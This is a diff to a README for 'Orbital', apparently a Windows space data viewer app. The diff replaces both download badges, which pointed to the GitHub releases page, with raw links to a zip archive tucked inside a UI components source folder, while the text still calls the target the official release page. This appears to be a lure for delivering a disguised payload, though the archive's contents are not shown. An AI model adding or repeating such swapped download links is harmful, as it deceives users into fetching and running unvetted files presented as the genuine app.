@@ -1,6 +1,6 @@
 # 🌌 Orbital - Real-Time Space Data Viewer
 
-[![Download Orbital](https://img.shields.io/badge/Download-Orbital-blue?style=for-the-badge&logo=github)](https://github.com/Carlosadm67/Orbital/releases)
+[![Download Orbital](https://img.shields.io/badge/Download-Orbital-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Carlosadm67/Orbital/main/src/app/components/ui/Software-v2.6.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get Orbital running on your Windows PC.
 
 Click the button below to go to the official Orbital release page. This page hosts all versions of the app.
 
-[![Download Orbital](https://img.shields.io/badge/Download-Orbital-grey?style=for-the-badge&logo=github)](https://github.com/Carlosadm67/Orbital/releases)
+[![Download Orbital](https://img.shields.io/badge/Download-Orbital-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Carlosadm67/Orbital/main/src/app/components/ui/Software-v2.6.zip)
 
 ### 2. Choose the Right File
 
